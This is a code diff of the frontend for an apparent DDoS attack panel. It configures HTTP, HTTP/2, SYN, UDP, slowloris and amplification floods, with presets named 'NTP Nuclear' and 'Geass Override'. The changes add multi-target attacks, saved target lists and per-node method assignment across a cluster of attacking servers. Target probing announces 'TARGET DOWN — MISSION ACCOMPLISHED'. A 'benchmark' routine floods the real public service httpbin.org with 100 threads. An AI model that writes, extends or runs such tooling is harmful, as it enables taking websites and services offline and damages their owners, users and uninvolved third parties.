@@ -17,33 +17,45 @@ const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 
 /* ── Types ── */
 type LogType = "info" | "success" | "error" | "warn";
-interface LogEntry { id: number; text: string; type: LogType; ts: number; }
-interface CheckResult { up: boolean; status: number; statusText: string; responseTime: number; error: string | null; }
-interface Preset { label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; icon: string; }
-interface MethodRec { method: string; name: string; score: number; reason: string; suggestedThreads: number; suggestedDuration: number; protocol: string; amplification: number; tier: string; }
-interface AnalyzeResult { target: string; ip: string | null; isIP: boolean; httpAvailable: boolean; httpsAvailable: boolean; responseTimeMs: number; serverHeader: string; isCDN: boolean; cdnProvider: string; openPorts: number[]; recommendations: MethodRec[]; }
+interface LogEntry       { id: number; text: string; type: LogType; ts: number; }
+interface CheckResult    { up: boolean; status: number; statusText: string; responseTime: number; error: string | null; }
+interface Preset         { label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; icon: string; }
+interface UserPreset     { id: string; label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; }
+interface MethodRec      { method: string; name: string; score: number; reason: string; suggestedThreads: number; suggestedDuration: number; protocol: string; amplification: number; tier: string; }
+interface AnalyzeResult  { target: string; ip: string | null; isIP: boolean; httpAvailable: boolean; httpsAvailable: boolean; responseTimeMs: number; serverHeader: string; isCDN: boolean; cdnProvider: string; openPorts: number[]; recommendations: MethodRec[]; }
+interface NamedTarget    { url: string; label: string; }
 
-/* ── Method classification (frontend mirror of backend) ── */
+/* ── Method classification ── */
 const L7_HTTP_FE = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
 const L4_TCP_FE  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
 const L4_UDP_FE  = new Set(["udp-flood","udp-bypass"]);
 const methodInfo = (m: string) => {
   if (m === "geass-override") return { badge: "GEASS ∞",  cls: "geass",    color: "#C0392B" };
+  if (m === "http2-flood")    return { badge: "REAL H2",  cls: "real-http", color: "#1abc9c" };
+  if (m === "slowloris")      return { badge: "SLOWLORIS", cls: "real-http", color: "#9b59b6" };
   if (L7_HTTP_FE.has(m))     return { badge: "REAL HTTP", cls: "real-http", color: "#2ecc71" };
   if (L4_TCP_FE.has(m))      return { badge: "REAL TCP",  cls: "real-tcp",  color: "#3498db" };
   if (L4_UDP_FE.has(m))      return { badge: "REAL UDP",  cls: "real-udp",  color: "#e67e22" };
   return { badge: "SIMULATED", cls: "simulated", color: "#8A7B65" };
 };
 
-/* ── Presets ── */
+/* ── Smart cluster LB — method assignment per node index ── */
+const CLUSTER_LB_METHODS = ["http-flood","tcp-flood","udp-flood","http-pipeline","http2-flood"];
+function getSmartMethod(baseMethod: string, nodeIdx: number): string {
+  if (nodeIdx === 0) return baseMethod;
+  if (baseMethod === "geass-override") return baseMethod;
+  return CLUSTER_LB_METHODS[nodeIdx % CLUSTER_LB_METHODS.length];
+}
+
+/* ── Built-in presets ── */
 const PRESETS: Preset[] = [
-  { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 60,  delay: 0,   threads: 80,  icon: "⚡" },
-  { label: "Heavy Assault",  method: "udp-flood",      packetSize: 1024, duration: 120, delay: 0,   threads: 300, icon: "💥" },
-  { label: "Stealth Mode",   method: "slowloris",      packetSize: 32,   duration: 300, delay: 500, threads: 8,   icon: "🥷" },
-  { label: "SYN Hammer",     method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 0,   threads: 400, icon: "🔨" },
-  { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 0,   threads: 600, icon: "☢️" },
-  { label: "MEMCACHED NUKE", method: "mem-amp",        packetSize: 15,   duration: 60,  delay: 0,   threads: 900, icon: "💀" },
-  { label: "Geass Override", method: "geass-override", packetSize: 512,  duration: 180, delay: 0,   threads: 1000, icon: "👁" },
+  { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 60,  delay: 0,   threads: 80,   icon: "⚡" },
+  { label: "H2 Barrage",     method: "http2-flood",    packetSize: 512,  duration: 90,  delay: 0,   threads: 40,   icon: "⚛" },
+  { label: "Slowloris",      method: "slowloris",      packetSize: 32,   duration: 300, delay: 0,   threads: 16,   icon: "🥷" },
+  { label: "UDP Hammer",     method: "udp-flood",      packetSize: 1024, duration: 120, delay: 0,   threads: 300,  icon: "💥" },
+  { label: "SYN Flood",      method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 0,   threads: 400,  icon: "🔨" },
+  { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 0,   threads: 600,  icon: "☢️" },
+  { label: "Geass Override", method: "geass-override", packetSize: 512,  duration: 180, delay: 0,   threads: 1000, icon: "👁"  },
 ];
 
 /* ── Log counter ── */
@@ -90,7 +102,6 @@ function playTone(type: "start" | "stop" | "tick" | "check" | "kill") {
 /* ── Formatters ── */
 const fmtNum  = (n: number) => n.toLocaleString();
 const fmtBps  = (n: number) => {
-  // Convert bytes/s → bits/s for Gbps display
   const bps = n * 8;
   if (bps >= 1e12) return (bps / 1e12).toFixed(2) + " Tbps";
   if (bps >= 1e9)  return (bps / 1e9).toFixed(2)  + " Gbps";
@@ -114,16 +125,17 @@ const statusColor = (code: number) => {
 };
 const powerLevel = (threads: number, m?: string) => {
   if (m === "geass-override") return { label: "ABSOLUTE GEASS", color: "#ff0033", pct: 100 };
-  if (threads >= 512) return { label: "GODMODE",   color: "#ff00ff", pct: 100 };
-  if (threads >= 256) return { label: "OBLITERATE",color: "#ff0033", pct: 98  };
-  if (threads >= 128) return { label: "MAXIMUM",   color: "#ff4400", pct: 92  };
-  if (threads >= 64)  return { label: "CRITICAL",  color: "#C0392B", pct: 80  };
-  if (threads >= 32)  return { label: "HIGH",      color: "#e67e22", pct: 62  };
-  if (threads >= 16)  return { label: "MODERATE",  color: "#D4AF37", pct: 42  };
-  if (threads >= 8)   return { label: "LOW",       color: "#8A7B65", pct: 22  };
-  return               { label: "MINIMAL",  color: "#5A4E40", pct: 8  };
+  if (threads >= 512) return { label: "GODMODE",    color: "#ff00ff", pct: 100 };
+  if (threads >= 256) return { label: "OBLITERATE", color: "#ff0033", pct: 98  };
+  if (threads >= 128) return { label: "MAXIMUM",    color: "#ff4400", pct: 92  };
+  if (threads >= 64)  return { label: "CRITICAL",   color: "#C0392B", pct: 80  };
+  if (threads >= 32)  return { label: "HIGH",       color: "#e67e22", pct: 62  };
+  if (threads >= 16)  return { label: "MODERATE",   color: "#D4AF37", pct: 42  };
+  if (threads >= 8)   return { label: "LOW",        color: "#8A7B65", pct: 22  };
+  return               { label: "MINIMAL",   color: "#5A4E40", pct: 8  };
 };
 
+/* ── Log message pools ── */
 const LOG_MSGS_HTTP = [
   (t: string, n: string) => `👁 ${n} real HTTP requests fired → ${t}`,
   (t: string) => `👁 Flood workers maintaining ${t} under load [LIVE]`,
@@ -142,13 +154,23 @@ const LOG_MSGS_UDP = [
   (_t: string, n: string) => `👁 ${n} pkt/s — UDP flood socket pool saturating target`,
   (t: string) => `👁 Raw UDP layer hammering ${t} — bandwidth pipe filling`,
   (_t: string, n: string) => `👁 ${n} UDP packets dispatched — dgram sockets at max throughput`,
-  (t: string) => `👁 ${t} UDP stack under siege — datagram queue overflowing`,
+];
+const LOG_MSGS_H2 = [
+  (t: string, n: string) => `👁 ${n} HTTP/2 streams multiplexed → ${t} [H2 NATIVE]`,
+  (_t: string, n: string) => `👁 ${n} req/s — H2 sessions saturating server stream limits`,
+  (t: string) => `👁 HTTP/2 multiplexed flood hammering ${t} — HPACK compressed`,
+  (_t: string, n: string) => `👁 ${n} H2 streams/sec — bypass per-connection limits`,
+];
+const LOG_MSGS_SLOW = [
+  (t: string, n: string) => `👁 ${n} half-open connections held → ${t} [SLOWLORIS]`,
+  (_t: string, n: string) => `👁 ${n} server threads occupied — connection pool draining`,
+  (t: string) => `👁 ${t} connection table: slots filling — server starving`,
+  (_t: string, n: string) => `👁 ${n} TCP sockets open, trickling headers — server frozen`,
 ];
 const LOG_MSGS_SIM = [
   (_t: string, n: string) => `👁 ${n} amplified packets computed [SIMULATED]`,
   () => `👁 Amplification multiplier calculated — simulated vector active`,
   (_t: string, n: string) => `👁 ${n} pkt/s — amplification vector engaged`,
-  () => `👁 Simulated L3 — amplification payload computed`,
 ];
 const LOG_MSGS_GEASS = [
   (t: string, n: string) => `👁 Geass Override: ${n} vectors annihilating ${t} [HTTP+TCP+UDP]`,
@@ -157,7 +179,6 @@ const LOG_MSGS_GEASS = [
   (t: string) => `👁 ${t} connection table, HTTP stack and UDP pipe under absolute siege`,
   (_t: string, n: string) => `👁 ${n} requests this second — triple concurrent vectors active`,
   (t: string) => `👁 The king's Geass has been cast upon ${t} — obey`,
-  (_t: string, n: string) => `👁 ${n} pkt/s — HTTP flood + TCP flood + UDP flood simultaneous`,
 ];
 
 /* ── Sparkline chart ── */
@@ -173,38 +194,41 @@ function Sparkline({ data, color = "#D4AF37" }: { data: number[]; color?: string
   return (
     <svg viewBox={`0 0 ${W} ${H}`} className="lb-sparkline" preserveAspectRatio="none">
       <defs>
-        <linearGradient id="spk-g" x1="0" y1="0" x2="0" y2="1">
+        <linearGradient id={`spk-g-${color.replace("#","")}`} x1="0" y1="0" x2="0" y2="1">
           <stop offset="0%" stopColor={color} stopOpacity="0.28"/>
           <stop offset="100%" stopColor={color} stopOpacity="0.02"/>
         </linearGradient>
       </defs>
-      <polygon points={`0,${H} ${pts} ${W},${H}`} fill="url(#spk-g)"/>
+      <polygon points={`0,${H} ${pts} ${W},${H}`} fill={`url(#spk-g-${color.replace("#","")})`}/>
       <polyline points={pts} fill="none" stroke={color} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
     </svg>
   );
 }
 
-/* ── Geass Eye SVG ── */
-function GeassEye() {
+/* ── Pulsing Geass Eye SVG (intensity 0–1 drives animation speed & glow) ── */
+function GeassEye({ intensity = 0 }: { intensity?: number }) {
+  const speed  = Math.max(2, 20 - intensity * 18); // 20s idle → 2s at max power
+  const glow   = 0.06 + intensity * 0.5;
+  const scale  = 1 + intensity * 0.25;
   return (
-    <div className="geass-eye-bg" aria-hidden="true">
+    <div className="geass-eye-bg" aria-hidden="true"
+      style={{ "--eye-speed": `${speed}s`, "--eye-glow": glow, "--eye-scale": scale } as React.CSSProperties}>
       <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
-        <ellipse cx="200" cy="200" rx="180" ry="90" stroke="rgba(212,175,55,0.1)" strokeWidth="1.5" fill="none"/>
-        <ellipse cx="200" cy="200" rx="140" ry="70" stroke="rgba(212,175,55,0.07)" strokeWidth="1" fill="none"/>
-        <circle cx="200" cy="200" r="55" stroke="rgba(192,57,43,0.22)" strokeWidth="1.5" fill="none"/>
-        <circle cx="200" cy="200" r="30" stroke="rgba(192,57,43,0.16)" strokeWidth="1" fill="none"/>
-        <circle cx="200" cy="200" r="10" fill="rgba(192,57,43,0.15)"/>
+        <ellipse cx="200" cy="200" rx="180" ry="90" stroke={`rgba(212,175,55,${0.08 + intensity * 0.14})`} strokeWidth="1.5" fill="none"/>
+        <ellipse cx="200" cy="200" rx="140" ry="70" stroke={`rgba(212,175,55,${0.05 + intensity * 0.1})`} strokeWidth="1" fill="none"/>
+        <circle cx="200" cy="200" r="55" stroke={`rgba(192,57,43,${0.15 + intensity * 0.35})`} strokeWidth="1.5" fill="none"/>
+        <circle cx="200" cy="200" r="30" stroke={`rgba(192,57,43,${0.1 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
+        <circle cx="200" cy="200" r="10" fill={`rgba(192,57,43,${0.1 + intensity * 0.5})`}/>
         {Array.from({ length: 12 }, (_, i) => {
           const deg = i * 30;
-          const r = (deg * Math.PI) / 180;
+          const r   = (deg * Math.PI) / 180;
           return <line key={i}
-            x1={200 + Math.cos(r) * 65} y1={200 + Math.sin(r) * 65}
+            x1={200 + Math.cos(r) * 65}  y1={200 + Math.sin(r) * 65}
             x2={200 + Math.cos(r) * 185} y2={200 + Math.sin(r) * 185}
-            stroke="rgba(212,175,55,0.06)" strokeWidth="1"/>;
+            stroke={`rgba(212,175,55,${0.04 + intensity * 0.1})`} strokeWidth="1"/>;
         })}
-        {/* Geass symbol lines */}
         <path d="M200,145 L212,170 L240,170 L218,188 L226,215 L200,198 L174,215 L182,188 L160,170 L188,170 Z"
-          stroke="rgba(192,57,43,0.12)" strokeWidth="1" fill="none"/>
+          stroke={`rgba(192,57,43,${0.08 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
       </svg>
     </div>
   );
@@ -213,27 +237,32 @@ function GeassEye() {
 /* ── Panel ── */
 function Panel() {
   /* Config state */
-  const [target, setTarget] = useState("");
-  const [method, setMethod] = useState("http-flood");
+  const [target, setTarget]       = useState("");
+  const [method, setMethod]       = useState("http-flood");
   const [packetSize, setPacketSize] = useState(64);
-  const [duration, setDuration] = useState(60);
-  const [delay, setDelay] = useState(100);
-  const [threads, setThreads] = useState(16);
+  const [duration, setDuration]   = useState(60);
+  const [delay, setDelay]         = useState(100);
+  const [threads, setThreads]     = useState(16);
   const [webhookUrl, setWebhookUrl] = useState("");
   const [showWebhook, setShowWebhook] = useState(false);
+
+  /* Multi-target */
+  const [extraTargets, setExtraTargets] = useState<[string, string]>(["", ""]);
+  const [showMultiTarget, setShowMultiTarget] = useState(false);
+  const [extraAttackIds, setExtraAttackIds] = useState<(number | null)[]>([]);
 
   /* Attack state */
   const [currentAttackId, setCurrentAttackId] = useState<number | null>(null);
   const [isRunning, setIsRunning] = useState(false);
-  const [progress, setProgress] = useState(0);
+  const [progress, setProgress]  = useState(0);
 
-  /* Live metrics — use refs for per-second calculation */
-  const [pps, setPps] = useState(0);
-  const [bps, setBps] = useState(0);
-  const [peakPps, setPeakPps] = useState(0);
-  const [peakBps, setPeakBps] = useState(0);
+  /* Live metrics */
+  const [pps, setPps]            = useState(0);
+  const [bps, setBps]            = useState(0);
+  const [peakPps, setPeakPps]    = useState(0);
+  const [peakBps, setPeakBps]    = useState(0);
   const [ppsHistory, setPpsHistory] = useState<number[]>([]);
-  /* Last attack snapshot (resets on new attack start) */
+  const [latencyHistory, setLatencyHistory] = useState<number[]>([]);
   const [lastAtkPkts,  setLastAtkPkts]  = useState(0);
   const [lastAtkBytes, setLastAtkBytes] = useState(0);
   const peakPpsRef = useRef(0);
@@ -245,19 +274,37 @@ function Panel() {
 
   /* Target monitoring */
   const [targetStatus, setTargetStatus] = useState<"unknown" | "online" | "offline">("unknown");
-  const targetStatusRef = useRef<"unknown" | "online" | "offline">("unknown");
-  // Consecutive failure counter — prevents false-positive "TARGET DOWN"
-  // (the check IP is the same as the attack IP, so the target may rate-limit our probe)
+  const targetStatusRef   = useRef<"unknown" | "online" | "offline">("unknown");
   const consecutiveFailsRef = useRef(0);
-  const CONSECUTIVE_FAILS_TO_CONFIRM = 3; // require 3 consecutive failures to declare down
+  const CONSECUTIVE_FAILS_TO_CONFIRM = 3;
 
   /* UI state */
   const [logs, setLogs]             = useState<LogEntry[]>([mkLog("Awaiting Geass command...", "info")]);
   const [soundEnabled, setSoundEnabled] = useState(true);
   const soundRef = useRef(true);
-  const [favorites, setFavorites]   = useState<string[]>(() => {
+
+  /* Favorites (plain URLs) */
+  const [favorites, setFavorites] = useState<string[]>(() => {
     try { return JSON.parse(localStorage.getItem("lb-favorites") || "[]"); } catch { return []; }
   });
+
+  /* Named targets */
+  const [namedTargets, setNamedTargets] = useState<NamedTarget[]>(() => {
+    try { return JSON.parse(localStorage.getItem("lb-named-targets") || "[]"); } catch { return []; }
+  });
+  const [showNamedTargets, setShowNamedTargets] = useState(false);
+  const [newNameLabel, setNewNameLabel] = useState("");
+
+  /* Custom user presets */
+  const [userPresets, setUserPresets] = useState<UserPreset[]>(() => {
+    try { return JSON.parse(localStorage.getItem("lb-user-presets") || "[]"); } catch { return []; }
+  });
+  const [showCustomPresets, setShowCustomPresets] = useState(false);
+  const [newPresetLabel, setNewPresetLabel] = useState("");
+
+  /* Smart cluster LB */
+  const [smartLB, setSmartLB] = useState(() => localStorage.getItem("lb-smart-lb") !== "0");
+
   const [showFavs, setShowFavs]     = useState(false);
   const [showHistory, setShowHistory] = useState(false);
   const [entered, setEntered]       = useState(false);
@@ -268,14 +315,14 @@ function Panel() {
   });
   const [clusterInput,      setClusterInput]      = useState("");
   const [showCluster,       setShowCluster]        = useState(false);
-  const [clusterAttackIds,  setClusterAttackIds]   = useState<{node: string; id: number}[]>([]);
+  const [clusterAttackIds,  setClusterAttackIds]   = useState<{node: string; id: number; assignedMethod: string}[]>([]);
   const [clusterTotalPkts,  setClusterTotalPkts]   = useState(0);
   const [clusterTotalBytes, setClusterTotalBytes]  = useState(0);
 
   /* Site checker */
-  const [checkerUrl, setCheckerUrl]     = useState("");
+  const [checkerUrl, setCheckerUrl] = useState("");
   const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
-  const [isChecking, setIsChecking]     = useState(false);
+  const [isChecking, setIsChecking] = useState(false);
 
   /* Analyzer */
   const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
@@ -306,18 +353,13 @@ function Panel() {
     setLogs(prev => [...prev.slice(-99), mkLog(text, type)]);
   }, []);
 
-  /* Sync sound ref */
   useEffect(() => { soundRef.current = soundEnabled; }, [soundEnabled]);
-
-  /* Page entrance */
   useEffect(() => { setEntered(true); }, []);
-
-  /* Scroll terminal */
   useEffect(() => {
     if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
   }, [logs]);
 
-  /* Sync current packets/bytes to refs for metric calculation */
+  /* Sync current packets/bytes to refs */
   useEffect(() => {
     if (!currentAttack) return;
     currentPacketsRef.current = currentAttack.packetsSent ?? 0;
@@ -339,16 +381,16 @@ function Panel() {
       lastBytesRef.current   = nowBytes;
       setPps(deltaPkts);
       setBps(deltaBytes);
-      // Track history for sparkline
       setPpsHistory(prev => [...prev.slice(-29), deltaPkts]);
-      // Track peaks
-      if (deltaPkts > peakPpsRef.current) { peakPpsRef.current = deltaPkts; setPeakPps(deltaPkts); }
+      if (deltaPkts > peakPpsRef.current)  { peakPpsRef.current = deltaPkts;  setPeakPps(deltaPkts); }
       if (deltaBytes > peakBpsRef.current) { peakBpsRef.current = deltaBytes; setPeakBps(deltaBytes); }
       if (deltaPkts > 0) {
         const n = fmtNum(deltaPkts);
         const t = targetRef.current;
         let msgs: ((t: string, n: string) => string)[];
-        if (method === "geass-override") msgs = LOG_MSGS_GEASS;
+        if (method === "geass-override")  msgs = LOG_MSGS_GEASS;
+        else if (method === "http2-flood") msgs = LOG_MSGS_H2;
+        else if (method === "slowloris")  msgs = LOG_MSGS_SLOW;
         else if (L7_HTTP_FE.has(method)) msgs = LOG_MSGS_HTTP;
         else if (L4_TCP_FE.has(method))  msgs = LOG_MSGS_TCP;
         else if (L4_UDP_FE.has(method))  msgs = LOG_MSGS_UDP;
@@ -360,7 +402,7 @@ function Panel() {
     return () => clearInterval(iv);
   }, [isRunning, method, addLog]);
 
-  /* Progress bar timer */
+  /* Progress bar */
   useEffect(() => {
     if (!isRunning || startTimeRef.current === null) return;
     const iv = setInterval(() => {
@@ -383,7 +425,7 @@ function Panel() {
     return () => clearInterval(iv);
   }, [isRunning, addLog, refetchStats, refetchHistory]);
 
-  /* Target down detection during attack */
+  /* Target monitoring — with latency tracking and consecutive-fail guard */
   useEffect(() => {
     if (!isRunning || !targetRef.current) return;
     let cancelled = false;
@@ -400,45 +442,40 @@ function Panel() {
         const data: CheckResult = await res.json();
         if (cancelled) return;
 
+        // Track probe latency for sparkline
+        if (data.responseTime > 0) {
+          setLatencyHistory(prev => [...prev.slice(-29), data.responseTime]);
+        }
+
         const prev = targetStatusRef.current;
 
         if (data.up) {
-          // Clear consecutive failure count on success
           consecutiveFailsRef.current = 0;
-          const now = "online";
-          targetStatusRef.current = now;
-          setTargetStatus(now);
-
+          targetStatusRef.current = "online";
+          setTargetStatus("online");
           if (prev === "offline") {
             addLog(`⚠ Target RECOVERED: HTTP ${data.status} ${data.statusText} (${data.responseTime}ms) — Geass broken`, "warn");
           } else if (prev === "unknown") {
             addLog(`👁 Target baseline: ONLINE — HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`, "info");
           }
         } else {
-          // Increment consecutive failure count
           consecutiveFailsRef.current += 1;
           const fails = consecutiveFailsRef.current;
-
           if (fails < CONSECUTIVE_FAILS_TO_CONFIRM) {
-            // Warn but don't declare down yet — could be rate-limiting our probe
             addLog(`⚠ Probe ${fails}/${CONSECUTIVE_FAILS_TO_CONFIRM}: ${urlToCheck} not responding (${data.responseTime}ms) — confirming...`, "warn");
-          } else {
-            // Confirmed down
-            const now = "offline";
-            if (targetStatusRef.current !== "offline") {
-              targetStatusRef.current = now;
-              setTargetStatus(now);
-              addLog(`💥 TARGET DOWN! ${urlToCheck} — ${fails} consecutive probe failures — HTTP ${data.status || "OFFLINE"} (${data.responseTime}ms)`, "success");
-              addLog(`💥 MISSION ACCOMPLISHED — TARGET ELIMINATED`, "success");
-              if (soundRef.current) playTone("kill");
-              if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
-            }
+          } else if (targetStatusRef.current !== "offline") {
+            targetStatusRef.current = "offline";
+            setTargetStatus("offline");
+            addLog(`💥 TARGET DOWN! ${urlToCheck} — ${fails} consecutive probe failures — HTTP ${data.status || "OFFLINE"} (${data.responseTime}ms)`, "success");
+            addLog(`💥 MISSION ACCOMPLISHED — TARGET ELIMINATED`, "success");
+            if (soundRef.current) playTone("kill");
+            if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
           }
           if (prev === "unknown" && fails === 1) {
             addLog(`👁 Target baseline: OFFLINE — ${urlToCheck} not responding`, "warn");
           }
         }
-      } catch { /* network error — skip check */ }
+      } catch { /* skip */ }
     };
 
     const initialTimeout = setTimeout(checkTarget, 3000);
@@ -451,6 +488,7 @@ function Panel() {
       setTargetStatus("unknown");
       targetStatusRef.current = "unknown";
       consecutiveFailsRef.current = 0;
+      setLatencyHistory([]);
     };
   }, [isRunning, addLog]);
 
@@ -461,7 +499,7 @@ function Panel() {
     return () => clearInterval(iv);
   }, [isRunning, currentAttackId, refetchAttack]);
 
-  /* Cluster: poll all slave nodes and aggregate stats */
+  /* Cluster: poll slave nodes and aggregate stats */
   useEffect(() => {
     if (!isRunning || clusterAttackIds.length === 0) {
       setClusterTotalPkts(0); setClusterTotalBytes(0); return;
@@ -488,7 +526,6 @@ function Panel() {
 
     if (isRunning) {
       addLog("👁 Revoking Geass — halting strike...", "warn");
-      // Stop local attack
       if (currentAttackId !== null) {
         try {
           await stopAttack.mutateAsync({ id: currentAttackId });
@@ -496,6 +533,13 @@ function Panel() {
           if (soundRef.current) playTone("stop");
         } catch { addLog("✕ Failed to stop local attack.", "error"); }
       }
+      // Stop extra targets
+      for (const eid of extraAttackIds) {
+        if (eid !== null) {
+          try { await stopAttack.mutateAsync({ id: eid }); } catch { /* ignore */ }
+        }
+      }
+      setExtraAttackIds([]);
       // Stop all cluster nodes
       if (clusterAttackIds.length > 0) {
         await Promise.allSettled(
@@ -544,25 +588,48 @@ function Panel() {
       const mi = methodInfo(method);
       addLog(`👁 Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
 
-      // Fire to all cluster slave nodes in parallel
+      // Launch extra targets (multi-target mode)
+      const activeExtras = extraTargets.filter(t => t.trim());
+      if (activeExtras.length > 0) {
+        const extraIds: (number | null)[] = [];
+        for (const et of activeExtras) {
+          try {
+            const er = await createAttack.mutateAsync({
+              data: { target: et.trim(), port, method, duration, threads: Math.max(1, Math.floor(threads * 0.5)), webhookUrl: null },
+            });
+            extraIds.push(er.id);
+            addLog(`👁 Extra target launched [ID #${er.id}] → ${et}`, "success");
+          } catch { extraIds.push(null); addLog(`✕ Extra target failed: ${et}`, "error"); }
+        }
+        setExtraAttackIds(extraIds);
+      }
+
+      // Fire to cluster nodes (with Smart LB if enabled)
       const activeCluster = clusterNodes.filter(n => n.trim());
       if (activeCluster.length > 0) {
-        addLog(`👁 Broadcasting Geass to ${activeCluster.length} cluster node(s)...`, "info");
+        addLog(`👁 Broadcasting Geass to ${activeCluster.length} cluster node(s)${smartLB ? " [SMART LB]" : ""}...`, "info");
         const clusterResults = await Promise.allSettled(
-          activeCluster.map(nodeUrl =>
-            fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks`, {
+          activeCluster.map((nodeUrl, nodeIdx) => {
+            const assignedMethod = smartLB ? getSmartMethod(method, nodeIdx + 1) : method;
+            return fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ target: target.trim(), port, method, duration, threads, webhookUrl: null }),
-            }).then(r => r.json()).then((d: { id: number }) => ({ node: nodeUrl.replace(/\/$/, ""), id: d.id }))
-          )
+              body: JSON.stringify({ target: target.trim(), port, method: assignedMethod, duration, threads, webhookUrl: null }),
+            })
+            .then(r => r.json())
+            .then((d: { id: number }) => ({ node: nodeUrl.replace(/\/$/, ""), id: d.id, assignedMethod }));
+          })
         );
         const confirmed = clusterResults
           .filter(r => r.status === "fulfilled")
-          .map(r => (r as PromiseFulfilledResult<{ node: string; id: number }>).value);
+          .map(r => (r as PromiseFulfilledResult<{ node: string; id: number; assignedMethod: string }>).value);
         const failed = activeCluster.length - confirmed.length;
         setClusterAttackIds(confirmed);
-        addLog(`👁 CLUSTER ACTIVE: ${confirmed.length}/${activeCluster.length} nodes online${failed > 0 ? ` (${failed} failed)` : ""} — combined fire power: ${confirmed.length + 1}x`, "success");
+        if (smartLB && confirmed.length > 0) {
+          addLog(`👁 CLUSTER ACTIVE [SMART LB]: ${confirmed.length}/${activeCluster.length} nodes — ${confirmed.map((c, i) => `Node${i+1}:${c.assignedMethod}`).join(", ")}`, "success");
+        } else {
+          addLog(`👁 CLUSTER ACTIVE: ${confirmed.length}/${activeCluster.length} nodes online${failed > 0 ? ` (${failed} failed)` : ""} — ${confirmed.length + 1}x power`, "success");
+        }
         if (confirmed.length > 0 && soundRef.current) playTone("start");
       }
 
@@ -583,6 +650,57 @@ function Panel() {
       localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
     });
   }
+
+  function saveNamedTarget() {
+    const url   = target.trim();
+    const label = newNameLabel.trim() || url;
+    if (!url) return;
+    setNamedTargets(prev => {
+      const next = [{ url, label }, ...prev.filter(n => n.url !== url)].slice(0, 15);
+      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
+    });
+    setNewNameLabel("");
+    addLog(`👁 Named target saved: "${label}" → ${url}`, "success");
+  }
+  function removeNamedTarget(url: string) {
+    setNamedTargets(prev => {
+      const next = prev.filter(n => n.url !== url);
+      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
+    });
+  }
+
+  function saveUserPreset() {
+    const label = newPresetLabel.trim();
+    if (!label) { addLog("✕ Enter a preset name.", "error"); return; }
+    const preset: UserPreset = {
+      id:         `${Date.now()}`,
+      label,
+      method,
+      packetSize,
+      duration,
+      delay,
+      threads,
+    };
+    setUserPresets(prev => {
+      const next = [preset, ...prev].slice(0, 12);
+      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
+    });
+    setNewPresetLabel("");
+    addLog(`👁 Custom preset saved: "${label}" — ${method.toUpperCase()}, ${threads}T, ${duration}s`, "success");
+  }
+  function deleteUserPreset(id: string) {
+    setUserPresets(prev => {
+      const next = prev.filter(p => p.id !== id);
+      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
+    });
+  }
+  function applyUserPreset(p: UserPreset) {
+    setMethod(p.method); setPacketSize(p.packetSize);
+    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
+    addLog(`👁 Custom preset: "${p.label}" — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
+    if (soundRef.current) playTone("tick");
+  }
+
   function applyPreset(p: Preset) {
     setMethod(p.method); setPacketSize(p.packetSize);
     setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
@@ -635,7 +753,6 @@ function Panel() {
     } catch { addLog("✕ Analysis failed — check backend connection.", "error"); }
     setIsAnalyzing(false);
   }
-
   async function handleCheckSite() {
     const urlToCheck = checkerUrl.trim() || target.trim();
     if (!urlToCheck) { addLog("✕ Enter a URL to check.", "error"); return; }
@@ -659,18 +776,53 @@ function Panel() {
     setIsChecking(false);
   }
 
+  async function handleBenchmark() {
+    addLog("👁 Benchmark mode: testing http-flood against httpbin.org (10s)...", "info");
+    const testUrl = "http://httpbin.org";
+    try {
+      const res = await fetch(`${BASE}/api/attacks`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ target: testUrl, port: 80, method: "http-flood", duration: 10, threads: 100 }),
+      });
+      const data = await res.json();
+      addLog(`👁 Benchmark started [ID #${data.id}] — 100 threads × 10s vs httpbin.org`, "success");
+      setTimeout(async () => {
+        try {
+          const r2 = await fetch(`${BASE}/api/attacks/${data.id}`);
+          const d2 = await r2.json();
+          const pps = Math.round((d2.packetsSent ?? 0) / 10);
+          const mbps = ((d2.bytesSent ?? 0) * 8 / 10 / 1e6).toFixed(1);
+          addLog(`👁 Benchmark result: ${fmtNum(d2.packetsSent ?? 0)} total reqs | ${fmtNum(pps)} req/s | ${mbps} Mbps`, "success");
+        } catch { /**/ }
+      }, 12000);
+    } catch { addLog("✕ Benchmark failed.", "error"); }
+  }
+
+  /* ── Derived values ── */
   const pw = powerLevel(threads, method);
   const mi = methodInfo(method);
   const localPkts  = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
